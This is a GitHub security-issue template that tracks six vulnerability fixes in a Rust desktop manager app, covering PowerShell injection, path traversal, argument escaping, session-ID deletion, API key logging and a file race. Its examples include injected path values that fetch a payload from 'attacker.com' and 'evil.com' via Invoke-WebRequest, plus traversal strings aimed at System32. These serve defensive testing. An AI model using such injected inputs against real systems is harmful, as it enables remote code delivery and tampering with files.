---
name: "🔥 Security Fix - Batch 1"
about: Critical/High security vulnerabilities requiring immediate attention
title: "[SECURITY] Batch 1: Critical Security Fixes"
labels: security, P0, critical
assignees: ''
---

## 🚨 Security Issue Summary

This issue tracks the **Batch 1** critical security fixes identified in the code review conducted on 2026-09-08.

**Total Priority:** P0 - Critical  
**Target Completion:** 2 days  
**Estimated Effort:** 15 hours

---

## 📋 Issues to Fix

### 1. 🚨 PowerShell Command Injection (Critical)

**File:** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs:1927`  
**Severity:** Critical

**Problem:**
- `powershell_single_quoted()` only escapes single quotes
- String interpolation used to build PowerShell scripts
- Special characters like `` ` ``, `$` not properly escaped
- Attacker can inject commands via malicious path parameters with admin privileges

**Attack Scenario:**
```rust
install_root = "C:\\Program`Files; Invoke-WebRequest http://attacker.com/mal.exe"
// Results in command injection via backtick
```

**Fix Applied:**
- ✅ Added `validate_executable_path()` - whitelist validation
- ✅ Added `validate_powershell_argument()` - forbids dangerous characters
- ✅ Modified `run_claude_zh_patch_elevated()` to validate all inputs before execution

**Testing Required:**
- [ ] Test legitimate Program Files paths
- [ ] Test paths with spaces and Chinese characters
- [ ] Test attack vectors (should be rejected):
  - `C:\\Windows; Invoke-WebRequest evil.com`
  - `C:\\Program``Files`
  - `../../Windows/System32`

---

### 2. 🚨 Path Traversal - Unvalidated Install Path (High)

**File:** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs:2134`  
**Severity:** High

**Problem:**
- `install_claude_zh_patch_at_install_root()` accepts `install_root` string without validation
- Directly converts to `PathBuf` without checking legitimacy
- Attacker can provide `../../../Windows/System32` to execute patch in arbitrary locations

**Fix Applied:**
- ✅ Added path validation at function entry
- ✅ Canonical path resolution + whitelist check
- ✅ All subsequent uses changed to `validated_root`
- ✅ Proper error logging for validation failures

**Testing Required:**
- [ ] Test valid installation paths
- [ ] Test path traversal attempts (should be rejected)
- [ ] Test symlink attacks
- [ ] Verify error messages are user-friendly

---

### 3. 🚨 Windows Command Argument Escaping Flaw (High)

**File:** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs:2029`  
**Severity:** High

**Problem:**
- Custom `windows_quote_arg()` implementation may have edge cases
- Doesn't handle all CMD special characters (`&`, `|`, `<`, `>`)
- Attacker could bypass quoting in elevated PowerShell

**Mitigation Applied:**
- ✅ `validate_powershell_argument()` now rejects special characters
- ⚠️ **TODO:** Consider using Rust std library or `winsafe` for escaping

**Testing Required:**
- [ ] Test arguments with spaces
- [ ] Test arguments with quotes
- [ ] Test special characters (should be rejected)

---

### 4. 🔒 Session ID Path Injection (High)

**File:** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs:487`  
**Severity:** High

**Problem:**
- `DeleteClaudeSessionRequest` accepts `session_id` and `source_path` without validation
- Attacker can construct `session_id` containing `../` to delete unintended database files

**Fix Required:**
- [ ] Add `DeleteClaudeSessionRequest::validate()` method
- [ ] Enforce UUID format for `session_id` (regex: `^[a-zA-Z0-9_-]{1,64}$`)
- [ ] Reject path traversal characters (`..`, `/`, `\`)
- [ ] Whitelist `source_path` to AppData directories only
- [ ] Modify command handler to use `ValidatedDeleteRequest`

**Testing Required:**
- [ ] Test valid UUIDs
- [ ] Test malicious session IDs (should be rejected):
  - `../../../sensitive_data/db.sqlite`
  - `C:\Windows\System32\config`

---

### 5. 🔑 API Key Logging to Plaintext (High)

**File:** `crates/claude-codex-pro-core/src/relay_config.rs:265`  
**Severity:** High

**Problem:**
- `log_relay_test_event` logs complete `base_url` which may contain embedded API keys
- API keys exposed in log files accessible to local attackers

**Fix Required:**
- [ ] Create `sanitize_url_for_logging()` function
- [ ] Remove query parameters from URLs before logging
- [ ] Remove basic auth credentials from URLs
- [ ] Create `sanitize_auth_header()` for bearer tokens
- [ ] Apply sanitization to all log points

**Testing Required:**
- [ ] Test URL with API key query parameter (should be redacted)
- [ ] Test URL with basic auth (should be redacted)
- [ ] Test bearer token header (should show `Bearer [REDACTED]`)

---

### 6. 🔓 Settings File Race Condition (Medium)

**File:** `crates/claude-codex-pro-core/src/settings.rs:457`  
**Severity:** Medium

**Problem:**
- `save()` uses file lock but releases before writing
- TOCTOU (Time-of-Check to Time-of-Use) race condition
- Concurrent saves can corrupt configuration

**Fix Required:**
- [ ] Implement atomic file write pattern
- [ ] Write to temporary file while holding lock
- [ ] Use fsync to ensure data persistence
- [ ] Atomic rename to target file (still under lock)
- [ ] Clean up temp files on Drop

**Testing Required:**
- [ ] Test concurrent saves from multiple threads
- [ ] Test disk full scenario
- [ ] Verify file integrity after crash

---

## 📦 Implementation Checklist

- [x] Create security fix branch ~~(done: `fix/critical-security-issues-batch1`)~~ **Using main branch**
- [x] Add `validate_executable_path()` function
- [x] Add `validate_powershell_argument()` function
- [x] Modify `run_claude_zh_patch_elevated()` with validation
- [x] Modify `install_claude_zh_patch_at_install_root()` with validation
- [x] Add `dirs` dependency to Cargo.toml
- [ ] Wait for compilation to complete
- [ ] Run unit tests
- [ ] Manual security testing
- [ ] Implement Session ID validation (#4)
- [ ] Implement API key sanitization (#5)
- [ ] Implement atomic file write (#6)
- [ ] Code review (2+ reviewers)
- [ ] Merge to main
- [ ] Create hotfix release (v0.12.1)
- [ ] Update CHANGELOG.md

---

## 🧪 Testing Strategy

### Functional Tests
- Verify normal patch installation still works
- Test with legitimate Program Files paths
- Test with paths containing spaces/Chinese characters

### Security Tests
- Attempt all documented attack scenarios
- Verify all rejected with clear error messages
- Check no sensitive data in logs

### Regression Tests
- Existing Chinese patch tests pass
- Elevation dialog appears correctly
- Installation logs are correct

---

## 📊 Acceptance Criteria

- [ ] All 6 security issues fixed
- [ ] Compilation successful with no errors
- [ ] All unit tests pass
- [ ] Manual security testing passed
- [ ] Code review completed (2+ approvals)
- [ ] No regressions in existing functionality
- [ ] Documentation updated (CHANGELOG.md)

---

## 🔗 Related Documents

- [SECURITY_FIX_STRATEGY.md](../../SECURITY_FIX_STRATEGY.md) - Complete fix strategy document
- Code Review Report (wf_4a573211-fac)

---

## ⏱️ Timeline

**Day 1:**
- ✅ Issues #1, #2, #3 - PowerShell injection + Path validation (6h) **IN PROGRESS**
- [ ] Issue #4 - Session ID validation (2h)
- [ ] Issue #5 - API key sanitization (2h)

**Day 2:**
- [ ] Issue #6 - Atomic file write (2h)
- [ ] Testing + Code Review (3h)

**Total:** 15 hours over 2 days
